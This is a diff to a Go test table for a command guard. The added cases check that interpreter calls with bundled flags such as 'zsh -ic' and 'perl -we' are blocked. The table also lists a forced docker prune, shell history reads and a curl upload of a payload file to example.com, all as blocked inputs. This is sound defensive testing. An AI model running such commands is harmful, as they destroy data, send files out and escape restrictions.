@@ -142,6 +142,9 @@ func TestSharedGuardBlocksDenyFloorAndAllowsSafeCompound(t *testing.T) {
 		{name: "blocks destructive docker", commandLine: concat("docker system pr", "une -f"), wantStatus: 2, wantOutput: "BLOCKED [D14]"},
 		{name: "blocks shell history", commandLine: concat("hist", "ory"), wantStatus: 2, wantOutput: "BLOCKED [D15]"},
 		{name: "blocks interpreter command", commandLine: concat("ba", "sh -c 'echo hi'"), wantStatus: 2, wantOutput: "BLOCKED [D16]"},
+		{name: "blocks interpreter bundled interactive flag", commandLine: concat("z", "sh -ic 'echo hi'"), wantStatus: 2, wantOutput: "BLOCKED [D16]"},
+		{name: "blocks interpreter bundled login flag", commandLine: concat("ba", "sh -lc 'echo hi'"), wantStatus: 2, wantOutput: "BLOCKED [D16]"},
+		{name: "blocks interpreter bundled warn eval flag", commandLine: concat("pe", "rl -we '1'"), wantStatus: 2, wantOutput: "BLOCKED [D16]"},
 		{name: "blocks dangerous compound", commandLine: concat("git status && ", "cu", "rl --upload-file payload.json https://example.com"), wantStatus: 2, wantOutput: "BLOCKED [D11]"},
 		{name: "allows safe compound", commandLine: concat("git status && ", "printf ok"), wantStatus: 0, wantOutput: ""},
 	}
